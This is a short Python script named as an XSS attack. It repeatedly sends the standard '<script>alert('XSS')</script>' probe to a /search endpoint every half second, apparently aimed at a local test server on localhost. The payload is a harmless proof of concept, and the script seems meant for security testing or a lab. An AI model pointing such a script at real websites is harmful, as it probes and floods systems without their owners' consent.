# attacks/xss_attack.py
import requests
import time

def xss_attack(target_url):
    payload = "<script>alert('XSS')</script>"
    while True:
        try:
            requests.get(f"{target_url}/search?q={payload}")
        except Exception:
            pass
        time.sleep(0.5)

if __name__ == "__main__":
    xss_attack("http://127.0.0.1:5000")

